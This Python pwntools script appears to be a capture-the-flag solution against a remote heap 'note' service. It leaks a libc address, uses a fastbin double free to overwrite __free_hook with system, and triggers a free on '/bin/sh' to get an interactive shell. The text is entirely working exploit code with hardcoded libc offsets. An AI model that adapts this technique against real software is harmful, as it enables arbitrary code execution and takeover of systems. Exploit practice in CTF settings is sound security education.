from pwn import *

# r = process('./share/chal')
r = remote('10.113.184.121', 10058)
context.arch = 'amd64'
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def add_note(idx, len):
    r.recvuntil(b'choice: ')
    r.send(b'1\x00')
    r.recvuntil(b'Index: ')
    r.send(str(idx).encode() + b'\x00')
    r.recvuntil(b'Length: ')
    r.send(str(len).encode() + b'\x00')

def read_note(idx):
    r.recvuntil(b'choice: ')
    r.send(b'2\x00')
    r.recvuntil(b'Index: ')
    r.send(str(idx).encode() + b'\x00')
    r.recvline()

def write_note(idx, content):
    r.recvuntil(b'choice: ')
    r.send(b'3\x00')
    r.recvuntil(b'Index: ')
    r.send(str(idx).encode() + b'\x00')
    r.recvuntil(b'Content: ')
    r.send(content)

def del_note(idx):
    r.recvuntil(b'choice: ')
    r.send(b'4\x00')
    r.recvuntil(b'Index: ')
    r.send(str(idx).encode() + b'\x00')

# Leak libc address
for i in range(12, 15):
    add_note(i, 0x420)
for i in range(12, 14):
    del_note(i)
add_note(12, 0x420)
read_note(12)

leak_address = u64(r.recv(8))
print(f'Leak Adress = {hex(leak_address)}')
libc_base = leak_address - 0x1ed0e0
print(f'Libc Base = {hex(libc_base)}')
system_addr = libc_base + 0x52290
print(f'System Address = {hex(system_addr)}')
free_hook = libc_base + 0x1eee48
print(f'Free Hook = {hex(free_hook)}')
# raw_input()

# Use Double Free to point to __free_hook
for i in range(1, 10):
    add_note(i, 0x10)

for i in range(1, 8):
    del_note(i)
del_note(8) # a
del_note(9) # b
del_note(8) # a

# Clean tcache
log.info('Fill tcache... ')
for i in range(1, 0x8):
    add_note(i, 0x10)

log.info('Change a point to free_hook... ')
# Start with fastbin
add_note(8, 0x18) # a
write_note(8, p64(free_hook)) # a -> free_hook

log.info('Change free_hook to system_addr... ')
bin_sh = u64(b'/bin/sh\x00')
add_note(9, 0x10) # first malloc : Currently, fast_bin -> a -> free_hook
write_note(9, p64(bin_sh))
add_note(10, 0x10) # second malloc : Currently, fast_bin -> free_hook
# write_note(10, p64(system_addr))
add_note(11, 0x10) # third malloc : get the address of free_hook
write_note(11, p64(system_addr))
raw_input() # important to pause here, but I don't know why
del_note(9)

r.interactive()